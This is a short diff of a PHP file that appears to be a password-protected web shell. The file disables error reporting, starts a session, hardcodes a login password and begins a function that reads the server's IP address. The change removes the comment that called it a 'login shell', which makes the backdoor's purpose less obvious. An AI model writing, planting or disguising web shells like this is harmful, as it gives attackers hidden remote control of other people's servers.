@@ -1,7 +1,7 @@
 <?php
  error_reporting(0);
  session_start();
- $auth="ImSle3py"; 	//password login shell("you can change with your own passworrd");
+ $auth="ImSle3py";
  function serverip(){
  	$ip1=$_SERVER['SERVER_ADDR'];
  	$ip2=gethostbyname($_SERVER['HTTP_HOST']);
